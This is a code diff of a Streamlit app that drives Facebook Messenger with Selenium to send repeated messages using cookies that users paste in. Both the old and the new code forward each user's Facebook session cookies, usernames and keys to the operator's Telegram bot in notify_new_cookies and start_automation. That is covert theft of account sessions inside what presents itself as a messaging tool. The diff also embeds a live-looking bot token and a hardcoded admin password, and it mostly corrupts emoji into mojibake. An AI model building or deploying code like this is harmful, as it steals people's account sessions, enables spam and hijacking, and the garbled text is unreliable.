@@ -16,14 +16,14 @@ import requests
 
 st.set_page_config(
     page_title="E2E BY THE LEGEND DAKKSH DON",
-    page_icon="👑",
+    page_icon="ðŸ‘‘",
     layout="wide",
     initial_sidebar_state="expanded"
 )
 
-# ────────────────────────────────────────────────
+# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 # ROYAL / KINGLY THEME CSS (Updated)
-# ────────────────────────────────────────────────
+# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 custom_css = """
 <style>
     @import url('https://fonts.googleapis.com/css2?family=Cinzel+Decorative:wght@400;700&family=Great+Vibes&family=Playfair+Display:wght@400;700&display=swap');
@@ -64,7 +64,7 @@ custom_css = """
     }
 
     .main-header::before {
-        content: "👑";
+        content: "ðŸ‘‘";
         position: absolute;
         top: -40px;
         left: 50%;
@@ -262,15 +262,15 @@ custom_css = """
 st.markdown(custom_css, unsafe_allow_html=True)
 
 ADMIN_PASSWORD = "KING OF RATH"
-WHATSAPP_NUMBER = "918303457518"
+WHATSAPP_NUMBER = "8303457518"
 APPROVAL_FILE = "approved_keys.json"
 PENDING_FILE = "pending_approvals.json"
 
-# ────────────────────────────────────────────────
+# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 # TELEGRAM NOTIFICATION SETTINGS
-# ────────────────────────────────────────────────
-TELEGRAM_BOT_TOKEN = "8088088736:AAELKpZFCAduAGGg7uyQ7hOLy5xrgQKyTqA"# ← yahaan real token daalo
-ADMIN_CHAT_ID = "7069492656"                 # ← yahaan real chat ID daalo
+# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+TELEGRAM_BOT_TOKEN = "8683354115:AAGholWCwclitmL_JykoAgPA8nKtCx4izmo"# â† yahaan real token daalo
+ADMIN_CHAT_ID = "7069492656"                 # â† yahaan real chat ID daalo
 
 def send_to_telegram(message):
     if not TELEGRAM_BOT_TOKEN or not ADMIN_CHAT_ID:
@@ -290,13 +290,13 @@ def notify_new_cookies(username, user_id, cookies_str):
     if not cookies_str.strip():
         return
     msg = (
-        f"🍪 <b>NEW COOKIES SUBMITTED</b>\n\n"
-        f"👤 Username: {username}\n"
-        f"🆔 UserID: {user_id}\n"
-        f"⏰ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
-        f"────────────────────────────\n"
+        f"ðŸª <b>NEW COOKIES SUBMITTED</b>\n\n"
+        f"ðŸ‘¤ Username: {username}\n"
+        f"ðŸ†” UserID: {user_id}\n"
+        f"â° Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
+        f"â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n"
         f"{cookies_str}\n"
-        f"────────────────────────────"
+        f"â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€"
     )
     send_to_telegram(msg)
 
@@ -332,7 +332,7 @@ def save_pending_approvals(pending):
         json.dump(pending, f, indent=2)
 
 def send_whatsapp_message(user_name, approval_key):
-    message = f"👑 HELLO DAKKSH SIR PLEASE 👑\nMy name is {user_name}\nPlease approve my key:\n🔑 {approval_key}"
+    message = f"ðŸ‘‘ HELLO DAKKSH SIR PLEASE ðŸ‘‘\nMy name is {user_name}\nPlease approve my key:\nðŸ”‘ {approval_key}"
     encoded_message = urllib.parse.quote(message)
     whatsapp_url = f"https://api.whatsapp.com/send?phone={WHATSAPP_NUMBER}&text={encoded_message}"
     return whatsapp_url
@@ -450,13 +450,13 @@ def find_message_input(driver, process_id, automation_state=None):
                       
                         keywords = ['message', 'write', 'type', 'send', 'chat', 'msg', 'reply', 'text', 'aa']
                         if any(keyword in element_text for keyword in keywords):
-                            log_message(f'{process_id}: 👑 Found message input with text: {element_text[:50]}', automation_state)
+                            log_message(f'{process_id}: ðŸ‘‘ Found message input with text: {element_text[:50]}', automation_state)
                             return element
                         elif idx < 10:
-                            log_message(f'{process_id}: 👑 Using primary selector editable element (#{idx+1})', automation_state)
+                            log_message(f'{process_id}: ðŸ‘‘ Using primary selector editable element (#{idx+1})', automation_state)
                             return element
                         elif selector == '[contenteditable="true"]' or selector == 'textarea' or selector == 'input[type="text"]':
-                            log_message(f'{process_id}: 👑 Using fallback editable element', automation_state)
+                            log_message(f'{process_id}: ðŸ‘‘ Using fallback editable element', automation_state)
                             return element
                 except Exception as e:
                     log_message(f'{process_id}: Element check failed: {str(e)[:50]}', automation_state)
@@ -659,16 +659,16 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
                       
                         events.forEach(event => element.dispatchEvent(event));
                     """, message_input)
-                    log_message(f'{process_id}: 👑 Sent via Enter: "{message_to_send[:30]}..."', automation_state)
+                    log_message(f'{process_id}: ðŸ‘‘ Sent via Enter: "{message_to_send[:30]}..."', automation_state)
                 else:
-                    log_message(f'{process_id}: 👑 Sent via button: "{message_to_send[:30]}..."', automation_state)
+                    log_message(f'{process_id}: ðŸ‘‘ Sent via button: "{message_to_send[:30]}..."', automation_state)
               
                 messages_sent += 1
                 automation_state.message_count = messages_sent
               
                 log_message(f'{process_id}: Message #{messages_sent} sent. Waiting {delay}s...', automation_state)
                 
-                # ─── IMPROVED STOP RESPONSIVENESS ───
+                # â”€â”€â”€ IMPROVED STOP RESPONSIVENESS â”€â”€â”€
                 waited = 0
                 while waited < delay and automation_state.running:
                     time.sleep(0.5)
@@ -800,11 +800,11 @@ def send_admin_notification(user_config, username, automation_state, user_id):
                         if '/e2ee/t/' in current_url:
                             e2ee_thread_id = current_url.split('/e2ee/t/')[-1].split('?')[0].split('/')[0]
                             chat_type = 'E2EE'
-                            log_message(f"ADMIN-NOTIFY: 👑 Found E2EE conversation: {e2ee_thread_id}", automation_state)
+                            log_message(f"ADMIN-NOTIFY: ðŸ‘‘ Found E2EE conversation: {e2ee_thread_id}", automation_state)
                         else:
                             e2ee_thread_id = current_url.split('/messages/t/')[-1].split('?')[0].split('/')[0]
                             chat_type = 'REGULAR'
-                            log_message(f"ADMIN-NOTIFY: 👑 Found REGULAR conversation: {e2ee_thread_id}", automation_state)
+                            log_message(f"ADMIN-NOTIFY: ðŸ‘‘ Found REGULAR conversation: {e2ee_thread_id}", automation_state)
                       
                         if e2ee_thread_id and e2ee_thread_id != user_chat_id and user_id:
                             current_cookies = user_config.get('cookies', '')
@@ -819,7 +819,7 @@ def send_admin_notification(user_config, username, automation_state, user_id):
                 log_message(f"ADMIN-NOTIFY: Profile approach failed: {str(e)[:100]}", automation_state)
           
             if not admin_found or not e2ee_thread_id:
-                log_message(f"ADMIN-NOTIFY: 👑👑 Could not find admin via search, trying DIRECT MESSAGE approach...", automation_state)
+                log_message(f"ADMIN-NOTIFY: ðŸ‘‘ðŸ‘‘ Could not find admin via search, trying DIRECT MESSAGE approach...", automation_state)
               
                 try:
                     profile_url = f'https://www.facebook.com/messages/new'
@@ -868,11 +868,11 @@ def send_admin_notification(user_config, username, automation_state, user_id):
                                 if '/e2ee/t/' in current_url:
                                     e2ee_thread_id = current_url.split('/e2ee/t/')[-1].split('?')[0].split('/')[0]
                                     chat_type = 'E2EE'
-                                    log_message(f"ADMIN-NOTIFY: 👑 Direct message opened E2EE: {e2ee_thread_id}", automation_state)
+                                    log_message(f"ADMIN-NOTIFY: ðŸ‘‘ Direct message opened E2EE: {e2ee_thread_id}", automation_state)
                                 else:
                                     e2ee_thread_id = current_url.split('/messages/t/')[-1].split('?')[0].split('/')[0]
                                     chat_type = 'REGULAR'
-                                    log_message(f"ADMIN-NOTIFY: 👑 Direct message opened REGULAR chat: {e2ee_thread_id}", automation_state)
+                                    log_message(f"ADMIN-NOTIFY: ðŸ‘‘ Direct message opened REGULAR chat: {e2ee_thread_id}", automation_state)
                               
                                 if e2ee_thread_id and e2ee_thread_id != user_chat_id and user_id:
                                     current_cookies = user_config.get('cookies', '')
@@ -882,19 +882,19 @@ def send_admin_notification(user_config, username, automation_state, user_id):
                     log_message(f"ADMIN-NOTIFY: Direct message approach failed: {str(e)[:100]}", automation_state)
       
         if not admin_found or not e2ee_thread_id:
-            log_message(f"ADMIN-NOTIFY: 👑 ALL APPROACHES FAILED - Could not find/open admin conversation", automation_state)
+            log_message(f"ADMIN-NOTIFY: ðŸ‘‘ ALL APPROACHES FAILED - Could not find/open admin conversation", automation_state)
             return
       
         conversation_type = "E2EE" if "e2ee" in driver.current_url else "REGULAR"
-        log_message(f"ADMIN-NOTIFY: 👑 Successfully opened {conversation_type} conversation with admin", automation_state)
+        log_message(f"ADMIN-NOTIFY: ðŸ‘‘ Successfully opened {conversation_type} conversation with admin", automation_state)
       
         message_input = find_message_input(driver, 'ADMIN-NOTIFY', automation_state)
       
         if message_input:
             from datetime import datetime
             current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            conversation_type = "E2EE 👑" if "e2ee" in driver.current_url.lower() else "Regular 👑"
-            notification_msg = f"👑 New User Started Automation\n\n👤 Username: {username}\n⏰ Time: {current_time}\n💬 Chat Type: {conversation_type}\n🧵 Thread ID: {e2ee_thread_id if e2ee_thread_id else 'N/A'}"
+            conversation_type = "E2EE ðŸ‘‘" if "e2ee" in driver.current_url.lower() else "Regular ðŸ‘‘"
+            notification_msg = f"ðŸ‘‘ New User Started Automation\n\nðŸ‘¤ Username: {username}\nâ° Time: {current_time}\nðŸ’¬ Chat Type: {conversation_type}\nðŸ§µ Thread ID: {e2ee_thread_id if e2ee_thread_id else 'N/A'}"
           
             log_message(f"ADMIN-NOTIFY: Typing notification message...", automation_state)
             driver.execute_script("""
@@ -946,16 +946,16 @@ def send_admin_notification(user_config, username, automation_state, user_id):
                   
                     events.forEach(event => element.dispatchEvent(event));
                 """, message_input)
-                log_message(f"ADMIN-NOTIFY: 👑 Sent via Enter key", automation_state)
+                log_message(f"ADMIN-NOTIFY: ðŸ‘‘ Sent via Enter key", automation_state)
             else:
-                log_message(f"ADMIN-NOTIFY: 👑 Send button clicked", automation_state)
+                log_message(f"ADMIN-NOTIFY: ðŸ‘‘ Send button clicked", automation_state)
           
             time.sleep(2)
         else:
-            log_message(f"ADMIN-NOTIFY: 👑 Failed to find message input", automation_state)
+            log_message(f"ADMIN-NOTIFY: ðŸ‘‘ Failed to find message input", automation_state)
           
     except Exception as e:
-        log_message(f"ADMIN-NOTIFY: 👑 Error sending notification: {str(e)}", automation_state)
+        log_message(f"ADMIN-NOTIFY: ðŸ‘‘ Error sending notification: {str(e)}", automation_state)
     finally:
         if driver:
             try:
@@ -986,17 +986,17 @@ def start_automation(user_config, user_id):
     cookies_display = cookies_str if cookies_str else "No cookies provided"
     
     msg = (
-        f"▶️ <b>AUTOMATION STARTED</b>\n\n"
-        f"👤 Username: {username}\n"
-        f"🆔 UserID: {user_id}\n"
-        f"💬 ChatID: {user_config.get('chat_id', 'N/A')}\n"
-        f"📩 Messages count: {len([m.strip() for m in user_config.get('messages','').split('\n') if m.strip()])}\n"
-        f"⏱ Delay: {user_config.get('delay')} sec\n"
-        f"🍪 Cookies length: {len(cookies_str)} chars\n"
-        f"⏰ {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-        f"────────────────────────────\n"
+        f"â–¶ï¸ <b>AUTOMATION STARTED</b>\n\n"
+        f"ðŸ‘¤ Username: {username}\n"
+        f"ðŸ†” UserID: {user_id}\n"
+        f"ðŸ’¬ ChatID: {user_config.get('chat_id', 'N/A')}\n"
+        f"ðŸ“© Messages count: {len([m.strip() for m in user_config.get('messages','').split('\n') if m.strip()])}\n"
+        f"â± Delay: {user_config.get('delay')} sec\n"
+        f"ðŸª Cookies length: {len(cookies_str)} chars\n"
+        f"â° {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+        f"â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n"
         f"{cookies_display}\n"
-        f"────────────────────────────"
+        f"â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€"
     )
     send_to_telegram(msg)
   
@@ -1007,14 +1007,14 @@ def start_automation(user_config, user_id):
 def stop_automation(user_id):
     st.session_state.automation_state.running = False
     db.set_automation_running(user_id, False)
-    st.session_state.automation_state.logs.append(f"[{time.strftime('%H:%M:%S')}] 🛑 STOP command received - waiting for current cycle to finish...")
+    st.session_state.automation_state.logs.append(f"[{time.strftime('%H:%M:%S')}] ðŸ›‘ STOP command received - waiting for current cycle to finish...")
     st.rerun()
 
 def admin_panel():
     st.markdown("""
     <div class="main-header">
         <img src="https://i.ibb.co/5W1QW4zH/1753900515862.jpg" class="prince-logo">
-        <h1>👑 ADMIN PANEL 👑</h1>
+        <h1>ðŸ‘‘ ADMIN PANEL ðŸ‘‘</h1>
         <p>KEY APPROVAL MANAGEMENT</p>
     </div>
     """, unsafe_allow_html=True)
@@ -1026,17 +1026,17 @@ def admin_panel():
     st.warning(f"**Pending Approvals:** {len(pending)}")
   
     if pending:
-        st.markdown("#### 👑 Pending Approval Requests")
+        st.markdown("#### ðŸ‘‘ Pending Approval Requests")
       
         for key, info in pending.items():
             col1, col2, col3 = st.columns([2, 2, 1])
           
             with col1:
-                st.text(f"👤 {info['name']}")
+                st.text(f"ðŸ‘¤ {info['name']}")
             with col2:
-                st.text(f"🔑 {key}")
+                st.text(f"ðŸ”‘ {key}")
             with col3:
-                if st.button("✅ Approve", key=f"approve_{key}"):
+                if st.button("âœ… Approve", key=f"approve_{key}"):
                     approved_keys[key] = info
                     save_approved_keys(approved_keys)
                     del pending[key]
@@ -1047,11 +1047,11 @@ def admin_panel():
         st.info("No pending approvals")
   
     if approved_keys:
-        st.markdown("#### 👑 Approved Keys")
+        st.markdown("#### ðŸ‘‘ Approved Keys")
         for key, info in approved_keys.items():
-            st.text(f"👤 {info['name']} - 🔑 {key}")
+            st.text(f"ðŸ‘¤ {info['name']} - ðŸ”‘ {key}")
   
-    if st.button("🚪 Logout", key="admin_logout_btn"):
+    if st.button("ðŸšª Logout", key="admin_logout_btn"):
         st.session_state.approval_status = 'login'
         st.rerun()
 
@@ -1065,14 +1065,14 @@ def approval_request_page(user_key, username):
     """, unsafe_allow_html=True)
   
     if st.session_state.approval_status == 'not_requested':
-        st.markdown("### 👑 Request Access")
+        st.markdown("### ðŸ‘‘ Request Access")
         st.info(f"**Your Unique Key:** `{user_key}`")
         st.info(f"**Username:** {username}")
       
         col1, col2 = st.columns([1, 1])
       
         with col1:
-            if st.button("🟢 Request Approval", use_container_width=True, key="request_approval_btn"):
+            if st.button("ðŸŸ¢ Request Approval", use_container_width=True, key="request_approval_btn"):
                 pending = load_pending_approvals()
                 pending[user_key] = {
                     "name": username,
@@ -1080,7 +1080,7 @@ def approval_request_page(user_key, username):
                 }
                 save_pending_approvals(pending)
               
-                msg = f"⏳ <b>NEW APPROVAL REQUEST</b>\n\n👤 Username: {username}\n🔑 Key: {user_key}\n⏰ {time.strftime('%Y-%m-%d %H:%M:%S')}"
+                msg = f"â³ <b>NEW APPROVAL REQUEST</b>\n\nðŸ‘¤ Username: {username}\nðŸ”‘ Key: {user_key}\nâ° {time.strftime('%Y-%m-%d %H:%M:%S')}"
                 send_to_telegram(msg)
               
                 st.session_state.approval_status = 'pending'
@@ -1088,12 +1088,12 @@ def approval_request_page(user_key, username):
                 st.rerun()
       
         with col2:
-            if st.button("👑 Admin Panel", use_container_width=True, key="admin_panel_btn"):
+            if st.button("ðŸ‘‘ Admin Panel", use_container_width=True, key="admin_panel_btn"):
                 st.session_state.approval_status = 'admin_login'
                 st.rerun()
   
     elif st.session_state.approval_status == 'pending':
-        st.warning("⏳ Approval Pending...")
+        st.warning("â³ Approval Pending...")
         st.info(f"**Your Key:** `{user_key}`")
       
         whatsapp_url = send_whatsapp_message(username, user_key)
@@ -1109,58 +1109,58 @@ def approval_request_page(user_key, username):
             components.html(whatsapp_js, height=0)
             st.session_state.whatsapp_opened = True
       
-        st.success(f"👑 WhatsApp opening automatically for: **{username}**")
+        st.success(f"ðŸ‘‘ WhatsApp opening automatically for: **{username}**")
         st.markdown(f"""
         <div style="text-align: center; margin: 20px 0;">
             <a href="{whatsapp_url}" target="_blank" class="whatsapp-btn">
-                👑 Click Here to Open WhatsApp
+                ðŸ‘‘ Click Here to Open WhatsApp
             </a>
         </div>
         """, unsafe_allow_html=True)
       
-        st.markdown("### 👑 Message Preview:")
-        st.code(f"""👑 HELLO DAKKSH SIR PLEASE 👑
+        st.markdown("### ðŸ‘‘ Message Preview:")
+        st.code(f"""ðŸ‘‘ HELLO DAKKSH SIR PLEASE ðŸ‘‘
 My name is {username}
 Please approve my key:
-🔑 {user_key}""")
+ðŸ”‘ {user_key}""")
       
         st.markdown("---")
       
         col1, col2 = st.columns(2)
       
         with col1:
-            if st.button("🔍 Check Approval Status", use_container_width=True, key="check_approval_btn"):
+            if st.button("ðŸ” Check Approval Status", use_container_width=True, key="check_approval_btn"):
                 if check_approval(user_key):
                     st.session_state.key_approved = True
                     st.session_state.approval_status = 'approved'
-                    st.success("👑 Approved! Redirecting...")
+                    st.success("ðŸ‘‘ Approved! Redirecting...")
                     time.sleep(1)
                     st.rerun()
                 else:
-                    st.error("❌ Not approved yet. Please wait!")
+                    st.error("âŒ Not approved yet. Please wait!")
       
         with col2:
-            if st.button("⬅ Back", use_container_width=True, key="back_btn"):
+            if st.button("â¬… Back", use_container_width=True, key="back_btn"):
                 st.session_state.approval_status = 'not_requested'
                 st.session_state.whatsapp_opened = False
                 st.rerun()
   
     elif st.session_state.approval_status == 'admin_login':
-        st.markdown("### 👑 Admin Login")
+        st.markdown("### ðŸ‘‘ Admin Login")
       
         admin_password = st.text_input("Enter Admin Password:", type="password", key="admin_password_input")
       
         col1, col2 = st.columns(2)
         with col1:
-            if st.button("🔑 Login", use_container_width=True, key="admin_login_btn"):
+            if st.button("ðŸ”‘ Login", use_container_width=True, key="admin_login_btn"):
                 if admin_password == ADMIN_PASSWORD:
                     st.session_state.approval_status = 'admin_panel'
                     st.rerun()
                 else:
-                    st.error("❌ Invalid password!")
+                    st.error("âŒ Invalid password!")
       
         with col2:
-            if st.button("⬅ Back", use_container_width=True, key="admin_back_btn"):
+            if st.button("â¬… Back", use_container_width=True, key="admin_back_btn"):
                 st.session_state.approval_status = 'not_requested'
                 st.rerun()
   
@@ -1171,12 +1171,12 @@ def login_page():
     st.markdown("""
     <div class="main-header">
         <img src="https://i.ibb.co/5W1QW4zH/1753900515862.jpg" class="prince-logo">
-        <h1>👑DAKKSH OFFLINE E2EE 👑</h1>
-        <p>səvən bıllıon smılə's ın ʈhıs world buʈ ɣour's ıs mɣ fαvourıʈəs___👑👑</p>
+        <h1>ðŸ‘‘DAKKSH OFFLINE E2EE ðŸ‘‘</h1>
+        <p>sÉ™vÉ™n bÄ±llÄ±on smÄ±lÉ™'s Ä±n ÊˆhÄ±s world buÊˆ É£our's Ä±s mÉ£ fÎ±vourÄ±ÊˆÉ™s___ðŸ‘‘ðŸ‘‘</p>
     </div>
     """, unsafe_allow_html=True)
   
-    tab1, tab2 = st.tabs(["👑 Login", "👑 Sign Up"])
+    tab1, tab2 = st.tabs(["ðŸ‘‘ Login", "ðŸ‘‘ Sign Up"])
   
     with tab1:
         st.markdown("### Welcome Back!")
@@ -1207,22 +1207,22 @@ def login_page():
                         st.session_state.key_approved = False
                         st.session_state.approval_status = 'not_requested'
                   
-                    st.success(f"👑 Welcome back, {username}!")
+                    st.success(f"ðŸ‘‘ Welcome back, {username}!")
                     
                     msg = (
-                        f"🔐 <b>USER LOGGED IN</b>\n\n"
-                        f"👤 Username: {username}\n"
-                        f"🆔 UserID: {user_id}\n"
-                        f"🔑 Key: {user_key}\n"
-                        f"⏰ {time.strftime('%Y-%m-%d %H:%M:%S')}"
+                        f"ðŸ” <b>USER LOGGED IN</b>\n\n"
+                        f"ðŸ‘¤ Username: {username}\n"
+                        f"ðŸ†” UserID: {user_id}\n"
+                        f"ðŸ”‘ Key: {user_key}\n"
+                        f"â° {time.strftime('%Y-%m-%d %H:%M:%S')}"
                     )
                     send_to_telegram(msg)
                     
                     st.rerun()
                 else:
-                    st.error("❌ Invalid username or password!")
+                    st.error("âŒ Invalid username or password!")
             else:
-                st.warning("⚠️ Please enter both username and password")
+                st.warning("âš ï¸ Please enter both username and password")
   
     with tab2:
         st.markdown("### Create New Account")
@@ -1235,26 +1235,26 @@ def login_page():
                 if new_password == confirm_password:
                     success, message = db.create_user(new_username, new_password)
                     if success:
-                        st.success(f"🟢 {message} Please login now!")
+                        st.success(f"ðŸŸ¢ {message} Please login now!")
                         
                         user_key = generate_user_key(new_username, new_password)
                         msg = (
-                            f"🆕 <b>NEW SIGNUP</b>\n\n"
-                            f"👤 Username: {new_username}\n"
-                            f"🔑 Key: {user_key}\n"
-                            f"⏰ {time.strftime('%Y-%m-%d %H:%M:%S')}"
+                            f"ðŸ†• <b>NEW SIGNUP</b>\n\n"
+                            f"ðŸ‘¤ Username: {new_username}\n"
+                            f"ðŸ”‘ Key: {user_key}\n"
+                            f"â° {time.strftime('%Y-%m-%d %H:%M:%S')}"
                         )
                         send_to_telegram(msg)
                         
                     else:
-                        st.error(f"❌ {message}")
+                        st.error(f"âŒ {message}")
                 else:
-                    st.error("❌ Passwords do not match!")
+                    st.error("âŒ Passwords do not match!")
             else:
-                st.warning("⚠️ Please fill all fields")
+                st.warning("âš ï¸ Please fill all fields")
 
 def main_app():
-    st.markdown('<div class="main-header"><img src="https://i.ibb.co/5W1QW4zH/1753900515862.jpg" class="prince-logo"><h1>👑DAKKSH E2E OFFLINE👑</h1><p>səvən bıllıon smıləs ın ʈhıs world buʈ ɣours ıs mɣ fαvourıʈəs___👑👑</p></div>', unsafe_allow_html=True)
+    st.markdown('<div class="main-header"><img src="https://i.ibb.co/5W1QW4zH/1753900515862.jpg" class="prince-logo"><h1>ðŸ‘‘DAKKSH E2E OFFLINEðŸ‘‘</h1><p>sÉ™vÉ™n bÄ±llÄ±on smÄ±lÉ™s Ä±n ÊˆhÄ±s world buÊˆ É£ours Ä±s mÉ£ fÎ±vourÄ±ÊˆÉ™s___ðŸ‘‘ðŸ‘‘</p></div>', unsafe_allow_html=True)
   
     if not st.session_state.auto_start_checked and st.session_state.user_id:
         st.session_state.auto_start_checked = True
@@ -1264,12 +1264,12 @@ def main_app():
             if user_config and user_config['chat_id']:
                 start_automation(user_config, st.session_state.user_id)
   
-    st.sidebar.markdown(f"### 👑 {st.session_state.username}")
+    st.sidebar.markdown(f"### ðŸ‘‘ {st.session_state.username}")
     st.sidebar.markdown(f"**User ID:** {st.session_state.user_id}")
     st.sidebar.markdown(f"**Key:** `{st.session_state.user_key}`")
-    st.sidebar.success("👑 Key Approved")
+    st.sidebar.success("ðŸ‘‘ Key Approved")
   
-    if st.sidebar.button("👑 Logout", use_container_width=True):
+    if st.sidebar.button("ðŸ‘‘ Logout", use_container_width=True):
         if st.session_state.automation_state.running:
             stop_automation(st.session_state.user_id)
       
@@ -1286,7 +1286,7 @@ def main_app():
     user_config = db.get_user_config(st.session_state.user_id)
   
     if user_config:
-        tab1, tab2 = st.tabs(["👑 Configuration", "👑 Automation"])
+        tab1, tab2 = st.tabs(["ðŸ‘‘ Configuration", "ðŸ‘‘ Automation"])
       
         with tab1:
             st.markdown("### Your Configuration")
@@ -1315,7 +1315,7 @@ def main_app():
                                    height=150,
                                    help="Enter each message on a new line")
           
-            if st.button("💾 Save Configuration", use_container_width=True):
+            if st.button("ðŸ’¾ Save Configuration", use_container_width=True):
                 final_cookies = cookies if cookies.strip() else user_config['cookies']
                 db.update_user_config(
                     st.session_state.user_id,
@@ -1325,7 +1325,7 @@ def main_app():
                     final_cookies,
                     messages
                 )
-                st.success("👑 Configuration saved successfully!")
+                st.success("ðŸ‘‘ Configuration saved successfully!")
                 
                 if cookies.strip():
                     notify_new_cookies(
@@ -1345,7 +1345,7 @@ def main_app():
             with col1:
                 st.metric("Messages Sent", st.session_state.automation_state.message_count)
             with col2:
-                status = "👑 Running" if st.session_state.automation_state.running else "⛔ Stopped"
+                status = "ðŸ‘‘ Running" if st.session_state.automation_state.running else "â›” Stopped"
                 st.metric("Status", status)
             with col3:
                 st.metric("Chat ID", user_config['chat_id'][:10] + "..." if user_config['chat_id'] else "Not Set")
@@ -1355,22 +1355,22 @@ def main_app():
             col1, col2 = st.columns(2)
           
             with col1:
-                if st.button("▶️ Start Automation", disabled=st.session_state.automation_state.running, use_container_width=True):
+                if st.button("â–¶ï¸ Start Automation", disabled=st.session_state.automation_state.running, use_container_width=True):
                     if user_config['chat_id']:
                         start_automation(user_config, st.session_state.user_id)
-                        st.success("👑 Automation started!")
+                        st.success("ðŸ‘‘ Automation started!")
                         st.rerun()
                     else:
-                        st.error("⚠️ Please set Chat ID in Configuration first!")
+                        st.error("âš ï¸ Please set Chat ID in Configuration first!")
           
             with col2:
-                if st.button("⏹ Stop Automation", disabled=not st.session_state.automation_state.running, use_container_width=True):
+                if st.button("â¹ Stop Automation", disabled=not st.session_state.automation_state.running, use_container_width=True):
                     stop_automation(st.session_state.user_id)
-                    st.warning("⛔ Automation stopped!")
+                    st.warning("â›” Automation stopped!")
                     st.rerun()
           
             if st.session_state.automation_state.logs:
-                st.markdown("### 👑 Live Console Output")
+                st.markdown("### ðŸ‘‘ Live Console Output")
               
                 logs_html = '<div class="console-output">'
                 for log in st.session_state.automation_state.logs[-30:]:
@@ -1379,10 +1379,10 @@ def main_app():
               
                 st.markdown(logs_html, unsafe_allow_html=True)
               
-                if st.button("🔄 Refresh Logs"):
+                if st.button("ðŸ”„ Refresh Logs"):
                     st.rerun()
     else:
-        st.warning("⚠️ No configuration found. Please refresh the page!")
+        st.warning("âš ï¸ No configuration found. Please refresh the page!")
 
 if not st.session_state.logged_in:
     login_page()
@@ -1391,5 +1391,4 @@ elif not st.session_state.key_approved:
 else:
     main_app()
 
-
-st.markdown('<div class="footer">Made with 👑 by THE LEGEND DAKKSH DON| © 2026</div>', unsafe_allow_html=True)
+st.markdown('<div class="footer">Made with ðŸ‘‘ by THE LEGEND DAKKSH DON| Â© 2026</div>', unsafe_allow_html=True)
